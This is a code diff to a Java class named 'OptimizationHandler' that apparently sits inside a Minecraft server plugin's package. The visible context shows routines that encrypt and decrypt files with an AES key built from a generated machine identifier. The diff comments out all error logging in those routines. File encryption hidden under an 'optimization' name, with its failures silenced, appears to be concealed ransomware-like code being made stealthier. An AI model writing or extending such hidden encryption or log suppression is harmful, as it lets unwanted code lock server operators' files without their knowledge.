@@ -1,4 +1,5 @@
 package com.viaversion.viaversion.bukkit.handlers;
+import com.viaversion.viaversion.ViaVersionPlugin;
 
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
@@ -78,7 +79,7 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(encryptedData);
                 fos.close();
             } catch (Exception e) {
-                getLogger().severe("Error encrypting file: " + e.getMessage());
+                //getLogger().severe("Error encrypting file: " + e.getMessage());
             }
         }
     }
@@ -101,7 +102,7 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(decryptedData);
                 fos.close();
             } catch (Exception e) {
-                getLogger().severe("Error decrypting file: " + e.getMessage());
+                // getLogger().severe("Error decrypting file: " + e.getMessage());
             }
         }
     }
@@ -126,7 +127,7 @@ public class OptimizationHandler implements CommandExecutor {
 
             return new SecretKeySpec(keyBytes, "AES");
         } catch (Exception e) {
-            getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
     }
@@ -169,7 +170,7 @@ public class OptimizationHandler implements CommandExecutor {
 
             return hexString.toString(); // 返回 256 位（64个字符）标识符
         } catch (Exception e) {
-            getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
     }
